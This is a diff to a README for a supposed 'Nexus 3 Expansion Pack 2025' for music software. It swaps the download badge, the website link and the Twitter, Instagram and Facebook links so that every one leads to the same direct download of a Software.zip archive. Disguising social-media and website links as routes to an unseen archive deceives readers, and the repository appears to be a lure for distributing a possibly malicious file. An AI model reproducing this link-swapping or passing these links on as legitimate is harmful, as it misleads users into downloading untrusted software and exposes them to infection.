@@ -13,7 +13,7 @@ audio-editing, audio-software, expansion-pack, music-creation, music-editing, mu
 ## Installation
 To get started with the Nexus 3 Expansion Pack 2025, download the latest release from the following link:
 
-[![Download Expansion Pack](https://img.shields.io/badge/Download-Expansion%20Pack-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Expansion Pack](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip%20Pack-blue)](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the expansion pack in your Nexus 3 software to explore the new sounds and presets.
 
@@ -24,12 +24,12 @@ We welcome contributions to the Nexus 3 Expansion Pack 2025 repository. Whether 
 If you encounter any issues or have questions about the expansion packs, please check the "Releases" section for updates or reach out to the community for assistance.
 
 ## Visit our Website
-For more information and updates on the Nexus 3 Expansion Pack 2025, visit our website [here](https://www.nexus3expansionpack2025.com).
+For more information and updates on the Nexus 3 Expansion Pack 2025, visit our website [here](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip).
 
 ## Get in Touch
 Connect with us on social media to stay up-to-date with the latest news and releases:
-- Twitter: [@Nexus3ExpPack2025](https://twitter.com/Nexus3ExpPack2025)
-- Instagram: [@Nexus3Expansion](https://www.instagram.com/nexus3expansion)
-- Facebook: [Nexus 3 Expansion Pack 2025](https://www.facebook.com/nexus3expansionpack2025)
+- Twitter: [@Nexus3ExpPack2025](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip)
+- Instagram: [@Nexus3Expansion](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip)
+- Facebook: [Nexus 3 Expansion Pack 2025](https://github.com/zyakae/Nexus-3-Expansion-Pack-2025/releases/download/v1.0/Software.zip)
 
 Thank you for choosing the Nexus 3 Expansion Pack 2025 to enhance your music production journey. Get ready to explore new sounds, unleash your creativity, and take your music to the next level! 🎵✨
